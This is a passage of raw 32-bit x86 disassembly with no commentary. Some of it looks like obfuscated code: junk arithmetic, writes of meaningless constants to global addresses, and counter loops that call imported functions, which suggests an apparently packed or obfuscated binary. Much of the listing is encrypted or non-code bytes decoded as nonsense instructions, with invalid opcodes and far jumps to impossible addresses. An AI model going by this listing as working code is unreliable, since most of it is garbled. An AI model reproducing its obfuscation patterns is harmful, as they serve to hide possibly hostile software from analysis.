  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4245c2,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4245c6,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx-0x5b07f2e8],0xffffffb2
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x4063f2
  4063d4:	nop
  4063d5:	data16 jns 0x4063e7
  4063d8:	mov    WORD PTR [ebx],cs
  4063da:	clc    
  4063db:	mov    al,ds:0x810b79cd
  4063e0:	xchg   edi,eax
  4063e1:	and    BYTE PTR [edx],ch
  4063e3:	inc    eax
  4063e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063e5:	ins    BYTE PTR es:[edi],dx
  4063e6:	retf   
  4063e7:	adc    DWORD PTR [eax+0x5a],eax
  4063ea:	xor    eax,0x66e14f3a
  4063ef:	and    DWORD PTR [ecx+0x23c7922a],ebx
  4063f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063f6:	test   eax,0x5cbc63c5
  4063fb:	cs or  eax,0x10
  4063ff:	mov    DWORD PTR [edx+0x213f43ce],0x30c447f7
  406409:	jle    0x4063f8
  40640b:	add    eax,DWORD PTR cs:[esi-0x1ae0e875]
  406412:	sbb    DWORD PTR [eax-0x54bf02bc],ebx
  406418:	sub    BYTE PTR [esi+0x6f1fdc53],cl
  40641e:	repnz shl DWORD PTR [esi],cl
  406421:	aam    0x8a
  406423:	std    
  406424:	push   edx
  406425:	adc    ch,ch
  406427:	dec    esp
  406428:	shl    BYTE PTR [ecx-0x2b],cl
  40642b:	dec    eax
  40642c:	mov    ch,0xd7
  40642e:	xlat   BYTE PTR ds:[ebx]
  40642f:	xchg   ebx,eax
  406430:	shl    cl,0x4d
  406433:	push   ss
  406434:	enter  0x920a,0x53
  406438:	in     eax,dx
  406439:	ins    BYTE PTR es:[edi],dx
  40643a:	dec    BYTE PTR [ecx+0x45]
  40643d:	and    eax,edx
  40643f:	add    al,0xd7
  406441:	les    edx,FWORD PTR [esi]
  406443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406445:	inc    edi
  406446:	xchg   BYTE PTR [edx],dl
  406448:	and    ecx,DWORD PTR [eax]
  40644a:	les    ebx,FWORD PTR [ecx+0x78]
  40644d:	inc    ebp
  40644e:	mov    ds:0xf4d9fe3b,eax
  406453:	call   0xa699:0xc0c32ae7
  40645a:	mov    DWORD PTR [esi],esi
  40645c:	nop
  40645d:	jg     0x40647e
  40645f:	sbb    DWORD PTR [esi],esp
  406461:	aad    0xd3
  406463:	jp     0x406424
  406465:	cs fs ja 0x406412
  406469:	idiv   DWORD PTR [edi]
  40646b:	pop    edx
  40646c:	sbb    ecx,DWORD PTR [ebx]
  40646e:	retf   0x494b
  406471:	out    0xa5,al
  406473:	icebp  
  406474:	mov    esi,0x3ec8c085
  406479:	sub    eax,0xd10234b3
  40647e:	push   ecx
  40647f:	sahf   
  406480:	pop    edi
  406481:	test   eax,0x8843c84d
  406486:	into   
  406487:	test   DWORD PTR [edx],ebp
  406489:	scas   eax,DWORD PTR es:[edi]
  40648a:	add    al,0xd3
  40648c:	aas    
  40648d:	mov    ch,0x9a
  40648f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406490:	imul   edi,DWORD PTR [eax-0x31],0x4933ded9
  406497:	inc    esi
  406498:	add    BYTE PTR [eax+edx*2],dh
  40649b:	jae    0x4064ed
  40649d:	or     eax,0xcc061c74
  4064a2:	out    0x8d,al
  4064a4:	xchg   BYTE PTR [edx+0x35],al
  4064a7:	mov    edi,0xc8992559
  4064ac:	jb     0x4064ca
  4064ae:	shld   DWORD PTR [eax-0x3f],edi,cl
  4064b2:	ss sub al,0x9c
  4064b5:	adc    ch,BYTE PTR es:[edx-0x6d]
  4064b9:	xor    BYTE PTR [esi+0x596cfccd],ah
  4064bf:	into   
  4064c0:	mov    esi,0xb2eda744
  4064c5:	mov    esi,0x932b93bb
  4064ca:	lods   eax,DWORD PTR ds:[esi]
  4064cb:	outs   dx,BYTE PTR ds:[esi]
  4064cc:	jno    0x406517
  4064ce:	ins    DWORD PTR es:[edi],dx
  4064cf:	inc    eax
  4064d0:	mov    bh,0xd8
  4064d2:	pop    ecx
  4064d3:	xchg   DWORD PTR [eax-0x56],edx
  4064d6:	pop    es
  4064d7:	dec    eax
  4064d8:	push   ss
  4064d9:	retf   0x6a0b
  4064dc:	bound  bp,DWORD PTR [edx-0xf]
  4064e0:	add    edi,DWORD PTR [ecx-0x78]
  4064e3:	retf   0xb905
  4064e6:	add    edx,DWORD PTR [edi+0x782296d9]
  4064ec:	push   0xbc69a81b
  4064f1:	neg    BYTE PTR [esi]
  4064f3:	or     ah,BYTE PTR [esi-0x11]
  4064f6:	je     0x4064e8
  4064f8:	aad    0x1e
  4064fa:	pop    es
  4064fb:	sub    eax,0x2a208922
  406500:	cmp    eax,0x9c865dbd
  406505:	xchg   esp,eax
  406506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406507:	mov    bh,0x33
  406509:	clc    
  40650a:	add    edi,ecx
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0x50944057,edi
  406527:	in     eax,0x9c
  406529:	lahf   
  40652a:	or     eax,0x7f237e7e
  40652f:	jle    0x4065af
  406531:	adc    DWORD PTR [ecx+0x32],ebp
  406534:	mov    esi,0xb480387
  406539:	aam    0x82
  40653b:	xchg   edi,eax
  40653c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40653d:	rcl    DWORD PTR [ebx+0x19],0x64
  406541:	mov    WORD PTR [edi+0x45],ds
  406544:	jp     0x406552
  406546:	into   
  406547:	mov    ds:0xe0f618df,eax
  40654c:	outs   dx,DWORD PTR ds:[esi]
  40654d:	outs   dx,BYTE PTR ds:[esi]
  40654e:	jmp    0x406551
  406550:	lds    ecx,FWORD PTR [eax+0x29084aab]
  406556:	in     eax,0xd3
  406558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406559:	or     al,0xca
  40655b:	and    eax,0x4e31d31d
  406560:	fstp   QWORD PTR [esi]
  406562:	rol    BYTE PTR [ecx-0x5e],1
  406565:	dec    esp
  406566:	shl    BYTE PTR [eax],cl
  406568:	aam    0x40
  40656a:	push   es
  40656b:	out    dx,eax
  40656c:	sbb    ecx,DWORD PTR [ebx+0xad3924b]
  406572:	add    dl,BYTE PTR [eax]
  406574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406575:	adc    BYTE PTR cs:[ebp-0x6b58914d],dl
  40657c:	inc    ebp
  40657d:	ins    BYTE PTR es:[edi],dx
  40657e:	fdivr  st,st(1)
  406580:	fcom   DWORD PTR [eiz*2-0x21b43a]
  406587:	xchg   DWORD PTR [edi+0x5c320708],ebp
  40658d:	mov    ds:0x71b4d373,al
  406592:	loopne 0x406609
  406594:	outs   dx,BYTE PTR ds:[esi]
  406595:	xchg   DWORD PTR [ebx],esi
  406597:	cs loopne 0x4065f5
  40659a:	fadd   QWORD PTR [ecx-0x76]
  40659d:	mov    ds:0xd3ddcaec,al
  4065a2:	or     DWORD PTR [edi-0x7b2f1249],0xffffffc7
  4065a9:	scas   eax,DWORD PTR es:[edi]
  4065aa:	jo     0x40657e
  4065ac:	pop    ebp
  4065ad:	imul   ecx,DWORD PTR [edx+0x4b],0x4512b330
  4065b4:	ss mov bl,0x3c
  4065b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065b8:	arpl   dx,di
  4065ba:	xchg   ebx,eax
  4065bb:	push   es
  4065bc:	(bad)  
  4065bd:	(bad)  
  4065bf:	sbb    dh,ch
  4065c1:	mov    edi,0xbbbb88b4
  4065c6:	xlat   BYTE PTR ds:[ebx]
  4065c7:	cwde   
  4065c8:	call   0x8aa478ba
  4065cd:	pop    ss
  4065ce:	rcl    BYTE PTR [ebx+0x715d8a58],0xac
  4065d5:	in     eax,dx
  4065d6:	add    BYTE PTR [edx+0xc],bh
  4065d9:	mov    DWORD PTR [ebx-0x59],esi
  4065dc:	dec    ebx
  4065dd:	add    al,0x28
  4065df:	or     DWORD PTR [ebx-0x211277e9],edi
  4065e5:	pop    ecx
  4065e6:	es mov edi,0xe15b7767
  4065ec:	mov    dh,0xee
  4065ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065ef:	jg     0x4065b6
  4065f1:	cwde   
  4065f2:	sub    BYTE PTR [ebx+0x4963a3e6],ch
  4065f8:	mov    ?,edx
  4065fa:	test   al,0x88
  4065fc:	in     eax,dx
  4065fd:	and    BYTE PTR [ecx-0x3aeddb5a],dl
  406603:	mov    ebx,0x73553357
  406608:	stos   DWORD PTR es:[edi],eax
  406609:	dec    esp
  40660a:	cmc    
  40660b:	pop    esp
  40660c:	sti    
  40660d:	fstp   QWORD PTR [ebx+0x6]
  406611:	and    al,0x2
  406613:	test   eax,0xc787bfbb
  406618:	je     0x40663b
  40661a:	and    esi,DWORD PTR [edi+0x0]
  40661d:	mov    eax,ds:0xa23f59f7
  406622:	adc    BYTE PTR [ebp-0x1bfe30e2],bh
  406628:	and    al,0x2c
  40662a:	xor    al,0x4b
  40662c:	and    BYTE PTR [esi-0x42f0372f],cl
  406632:	sbb    BYTE PTR [ebp+0x2e],0x79
  406636:	ror    DWORD PTR [edi+edx*8+0xd],cl
  40663a:	jg     0x40661c
  40663c:	popf   
  40663d:	ds dec ebx
  40663f:	test   BYTE PTR [ecx-0x505413ad],bl
  406645:	retf   0x4aa1
  406648:	pop    ecx
  406649:	into   
  40664a:	sbb    BYTE PTR ds:0xa81584bd,cl
  406650:	dec    ebx
  406651:	add    ch,cl
  406653:	sbb    al,0x1
  406655:	lahf   
  406656:	idiv   bl
  406658:	dec    ebp
  406659:	cmp    DWORD PTR [esi+eiz*8-0x5e03a958],ebx
  406660:	fidiv  WORD PTR [eax]
  406662:	add    dh,BYTE PTR ds:0x5d8bb462
  406668:	lock sub ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	add    esp,DWORD PTR [edx+ecx*4]
  40674b:	in     al,0x40
  40674d:	add    bh,BYTE PTR [esi+0x7e]
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x4067a8
  406755:	adc    DWORD PTR [ecx+0x9cdcb4a],ebx
  40675b:	je     0x406728
  40675d:	popa   
  40675e:	sar    DWORD PTR [eax-0x4c],1
  406761:	aam    0xf2
  406763:	inc    esp
  406764:	dec    ebp
  406765:	sbb    al,0x90
  406767:	inc    ecx
  406768:	push   ss
  406769:	cmp    DWORD PTR [edx],0x75
  40676c:	mov    WORD PTR [esi],ds
  40676e:	cmp    dl,ah
  406770:	ja     0x86218ecc
  406776:	(bad)  
  406777:	std    
  406778:	and    eax,0x46ec878b
  40677d:	xchg   DWORD PTR [edx],ebp
  40677f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406780:	stc    
  406781:	inc    ebp
  406782:	test   BYTE PTR [ebp-0x60],bh
  406785:	call   0x80e1:0x85bf6bfe
  40678c:	dec    ecx
  40678d:	lea    eax,[edi+0x62]
  406790:	mov    ds:0x8daa36d6,eax
  406795:	cmp    al,dl
  406797:	enter  0x5ee9,0xad
  40679b:	sbb    eax,0x93e43d74
  4067a0:	dec    esp
  4067a1:	sbb    al,0xcf
  4067a3:	aas    
  4067a4:	bound  esi,QWORD PTR [eax+0xd37c58a]
  4067aa:	lods   al,BYTE PTR ds:[esi]
  4067ab:	and    DWORD PTR cs:[edx+0x4ea45b96],edx
  4067b2:	arpl   WORD PTR [eax+ebx*8-0x18],si
  4067b6:	ror    DWORD PTR [eax],1
  4067b8:	add    al,0x39
  4067ba:	clc    
  4067bb:	adc    DWORD PTR [edi],edi
  4067bd:	xchg   ecx,eax
  4067be:	into   
  4067bf:	cmp    edx,ebp
  4067c1:	das    
  4067c2:	dec    edx
  4067c3:	jnp    0x40679c
  4067c5:	jp     0x4067b2
  4067c7:	xor    al,0xaf
  4067c9:	push   ss
  4067ca:	into   
  4067cb:	mov    esi,DWORD PTR [edx-0x26c97484]
  4067d1:	adc    eax,0x90d6da76
  4067d6:	push   ss
  4067d7:	lods   al,BYTE PTR ds:[esi]
  4067d8:	popa   
  4067d9:	jmp    0xdad6bd9a
  4067de:	cdq    
  4067df:	mov    bh,bh
  4067e1:	cmp    eax,0xd000fe3c
  4067e6:	scas   al,BYTE PTR es:[edi]
  4067e7:	mov    bl,0x50
  4067e9:	pop    ds
  4067ea:	dec    edi
  4067eb:	ficomp DWORD PTR [ecx+ebx*4-0x59]
  4067ef:	data16 and al,0xc
  4067f2:	xchg   esi,eax
  4067f3:	push   edx
  4067f4:	sbb    dh,BYTE PTR ss:[edx]
  4067f7:	cmp    eax,DWORD PTR [ecx-0x43]
  4067fa:	fwait
  4067fb:	jp     0x4067f0
  4067fd:	mov    ds:0x72d3aa47,al
  406802:	fiadd  WORD PTR [ecx-0x5e]
  406805:	mov    eax,ds:0x4fa2a434
  40680a:	arpl   WORD PTR [esi+edi*4-0x63],di
  40680e:	adc    cl,BYTE PTR [edx+0x1a5ddff]
  406814:	shl    DWORD PTR [esi-0x75674eff],cl
  40681a:	pop    ecx
  40681b:	lds    edi,FWORD PTR [ebx]
  40681d:	mov    bh,0x4a
  40681f:	rcl    DWORD PTR [esi+0x8],cl
  406822:	stos   BYTE PTR es:[edi],al
  406823:	and    ebp,esp
  406825:	sub    DWORD PTR [edx+eiz*4+0x24],esp
  406829:	pushf  
  40682a:	pop    ss
  40682b:	or     dh,BYTE PTR [edi+0x3dede8a1]
  406831:	add    esp,DWORD PTR [edx+0x2f4d8dd3]
  406837:	popf   
  406838:	icebp  
  406839:	xor    al,0xc5
  40683b:	inc    ecx
  40683c:	(bad)  
  40683d:	push   ecx
  40683e:	test   bl,dl
  406840:	popa   
  406841:	pushf  
  406842:	fiadd  WORD PTR ds:0x420a78c8
  406848:	xchg   BYTE PTR [edx+0x21],bl
  40684b:	mov    ebp,0x175c8cf
  406850:	push   ss
  406851:	ss xchg esp,eax
  406853:	cwde   
  406854:	push   edi
  406855:	dec    esp
  406856:	mov    edi,0xcd9b2ae9
  40685b:	xchg   edx,eax
  40685c:	pop    ds
  40685d:	cmp    BYTE PTR [edi+0x4d43cee0],ah
  406863:	and    al,0x23
  406865:	dec    edi
  406866:	jno    0x88b018e6
  40686c:	mov    al,ds:0xb384c152
  406871:	call   0xf42a:0x2aa49de2
  406878:	inc    edx
  406879:	sub    al,0xb7
  40687b:	pop    edx
  40687c:	sub    eax,0x88285a07
  406881:	cdq    
  406882:	mov    eax,ds:0xd60b6db6
  406887:	cmp    DWORD PTR ds:0xc7c05503,0x45
  40688e:	call   0xf8dcedcb
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0x3f
  4068b9:	xchg   ebx,eax
  4068ba:	pop    ds
  4068bb:	mov    esi,0x7e7e0075
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x406911
  4068c5:	and    BYTE PTR [eax-0x7b5cc137],ah
  4068cb:	push   eax
  4068cd:	or     DWORD PTR [esi+0x65],ebx
  4068d0:	pop    ds
  4068d1:	or     al,0x1f
  4068d3:	mov    ah,0xa2
  4068d5:	mov    ebx,ecx
  4068d7:	add    DWORD PTR [esi-0x30cd85d7],0xffffff83
  4068de:	xor    al,0xa7
  4068e0:	push   ds
  4068e1:	mov    edi,DWORD PTR [eax-0x46]
  4068e4:	lods   al,BYTE PTR ds:[esi]
  4068e5:	out    dx,al
  4068e6:	xchg   esp,eax
  4068e7:	ss (bad) 
  4068e9:	addr16 int3 
  4068eb:	cmp    DWORD PTR [edi],0xf
  4068ee:	fs push ebp
  4068f0:	iret   
  4068f1:	dec    ebp
  4068f2:	(bad)  [ebp-0x39]
  4068f5:	cmp    al,0x5e
  4068f7:	and    al,0xdb
  4068f9:	mov    al,ds:0xacd902d3
  4068fe:	xlat   BYTE PTR ds:[ebx]
  4068ff:	aad    0x8b
  406901:	(bad)  
  406902:	jmp    0x4068be
  406904:	aad    0x67
  406906:	add    esp,esi
  406908:	pop    eax
  406909:	imul   ebp,DWORD PTR [esi],0x4921c270
  40690f:	int    0xe0
  406911:	mov    al,0x22
  406913:	mov    cl,0x92
  406915:	pop    ecx
  406916:	inc    esp
  406917:	mov    esi,0x42f99171
  40691c:	jbe    0x4068d9
  40691e:	ret    0xb83b
  406921:	and    eax,0x82b8de92
  406926:	xchg   edi,eax
  406927:	mov    WORD PTR [edx],cs
  406929:	jl     0x406983
  40692b:	mov    BYTE PTR [ebp+0x56],al
  40692e:	xor    DWORD PTR [eax],ebp
  406930:	xchg   ebp,eax
  406931:	jge    0x4068c9
  406933:	stos   DWORD PTR es:[edi],eax
  406934:	jmp    0x406916
  406936:	and    eax,DWORD PTR [ebx]
  406938:	jne    0x40693a
  40693a:	push   ecx
  40693b:	imul   ecx,DWORD PTR [ebx+0x3e],0x13758501
  406942:	add    DWORD PTR [ecx+ebx*2+0x672cb03d],edx
  406949:	lock cmp bl,BYTE PTR [esi+eiz*4+0x67]
  40694e:	jg     0x4068e2
  406950:	xchg   DWORD PTR [ecx+ebp*1+0x56],ebp
  406954:	fidiv  WORD PTR [ecx]
  406956:	(bad)  
  406957:	loop   0x406956
  406959:	sbb    al,0x77
  40695b:	popw   ds
  40695d:	push   es
  40695e:	mov    ?,WORD PTR [edx+0x60de698a]
  406964:	mov    ch,0xde
  406966:	jmp    0xb590:0x6e29b6ca
  40696d:	push   ss
  40696e:	pop    ebp
  40696f:	jbe    0x406910
  406971:	inc    eax
  406972:	inc    ebp
  406973:	fs (bad) 
  406975:	(bad)
  406978:	fsubr  QWORD PTR ds:[edx]
  40697b:	adc    esi,DWORD PTR ds:0x391e61d8
  406981:	cmp    DWORD PTR [ebx+0x5d],edx
  406984:	jl     0x406926
  406986:	out    0xd6,eax
  406988:	gs jo  0x40695b
  40698b:	add    eax,0x56dbfdb3
  406990:	xchg   esp,eax
  406992:	out    0x16,eax
  406994:	xchg   edx,eax
  406995:	call   0xdcc7:0x3e8fff76
  40699c:	xor    BYTE PTR [ebx],bh
  40699e:	leave  
  40699f:	ret    
  4069a0:	loop   0x4069a1
  4069a2:	scas   eax,DWORD PTR es:[edi]
  4069a3:	pop    ebp
  4069a4:	imul   esi,DWORD PTR [ecx],0x63
  4069a7:	adc    DWORD PTR ds:0xcf7e5b9c,ecx
  4069ad:	cmp    BYTE PTR [esi+ecx*2-0x48],dh
  4069b1:	out    dx,al
  4069b2:	mov    dl,0x15
  4069b4:	rcl    edi,0x4e
  4069b7:	addr16 or al,0xdf
  4069ba:	mov    al,0x19
  4069bc:	popa   
  4069bd:	sbb    DWORD PTR [eax],eax
  4069bf:	inc    ebx
  4069c0:	daa    
  4069c1:	hlt    
  4069c2:	(bad)  
  4069c3:	in     al,dx
  4069c4:	and    al,0xe2
  4069c6:	in     al,dx
  4069c7:	rol    DWORD PTR [ebp+0x19],cl
  4069ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069cb:	jo     0x4069b0
  4069cd:	stc    
  4069ce:	test   BYTE PTR [edi-0x2a],ah
  4069d1:	cwde   
  4069d2:	mov    WORD PTR [edx-0x1d],cs
  4069d5:	sbb    dl,ah
  4069d7:	push   cs
  4069d8:	cld    
  4069d9:	mov    bl,0xa9
  4069db:	sbb    DWORD PTR [esi],ebp
  4069dd:	cdq    
  4069de:	imul   esp,DWORD PTR [edi+0x3f9fd22a],0xffffffd7
  4069e5:	sti    
  4069e6:	fadd   QWORD PTR [edi+ebp*4]
  4069e9:	jo     0x406986
  4069eb:	(bad)  
  4069ec:	aas    
  4069ed:	adc    DWORD PTR [esi+0x1a14ab4b],ecx
  4069f3:	xor    BYTE PTR [edi],dl
  4069f5:	and    al,0x78
  4069f7:	xchg   esp,eax
  4069f8:	dec    esi
  4069f9:	xor    edx,eax
  4069fb:	jmp    0x406b4d
  406a00:	int    0xfb
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0x919b7a93
  406a0e:	gs leave 
  406a10:	add    DWORD PTR ds:[esi+0x7e],edi
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x4069a6
  406a19:	jnp    0x406a57
  406a1b:	rcl    eax,cl
  406a1d:	aad    0x5
  406a1f:	sar    edx,0x16
  406a22:	icebp  
  406a23:	xchg   edx,eax
  406a24:	outs   dx,DWORD PTR ds:[esi]
  406a25:	imul   eax,DWORD PTR [ebx],0xffffffb8
  406a28:	test   eax,0xc17c256a
  406a2d:	dec    edi
  406a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a2f:	add    cl,BYTE PTR [ebx-0x58]
  406a32:	retf   
  406a33:	or     BYTE PTR [ecx+0x27],ch
  406a36:	out    0xf7,eax
  406a38:	mov    ah,0x77
  406a3a:	and    bh,al
  406a3c:	inc    ebp
  406a3d:	mov    dl,0x97
  406a3f:	je     0x4069e8
  406a41:	mov    al,0xae
  406a43:	add    eax,0xa490556
  406a48:	jle    0x4069f0
  406a4a:	call   0x65f9fe21
  406a4f:	lods   eax,DWORD PTR ds:[esi]
  406a50:	psrlw  mm6,QWORD PTR [edi+ecx*1]
  406a54:	sub    DWORD PTR [ebx+0x31c82b33],0x4f5d2589
  406a5e:	aad    0xcc
  406a60:	dec    ebx
  406a61:	mov    dl,0x1
  406a63:	pusha  
  406a64:	outs   dx,DWORD PTR ds:[esi]
  406a65:	test   DWORD PTR [ebx+esi*4-0x32697011],esp
  406a6c:	aas    
  406a6d:	cmc    
  406a6e:	cmp    dl,BYTE PTR [ebp+0x3dfebf84]
  406a74:	mov    al,ds:0xd8fb7a3b
  406a79:	stos   BYTE PTR es:[edi],al
  406a7a:	jg     0x406a14
  406a7c:	movzx  eax,BYTE PTR [edx]
  406a7f:	xlat   BYTE PTR ds:[ebx]
  406a80:	shr    DWORD PTR ds:0x780837da,1
  406a86:	jg     0x406ae7
  406a88:	jge    0x406aa6
  406a8a:	xor    BYTE PTR [ebx-0x608c4df5],dl
  406a90:	test   DWORD PTR [ecx-0x33a854ac],0xa3f7336b
  406a9a:	scas   eax,DWORD PTR es:[edi]
  406a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a9c:	push   es
  406a9d:	lahf   
  406a9e:	test   eax,0x261785b7
  406aa3:	std    
  406aa4:	nop
  406aa5:	jnp    0x406a66
  406aa7:	call   FWORD PTR [edi]
  406aa9:	aas    
  406aaa:	mov    edx,DWORD PTR [edi-0x3b19c109]
  406ab0:	and    DWORD PTR ds:0x4e5ea3e5,ebx
  406ab6:	mov    al,ds:0x9eee703b
  406abb:	int    0x3f
  406abd:	jge    0x406b27
  406abf:	enter  0x60ca,0x4d
  406ac3:	inc    esp
  406ac4:	lea    edx,[esi-0x7771f8e7]
  406aca:	in     eax,0xf4
  406acc:	inc    esp
  406acd:	retf   
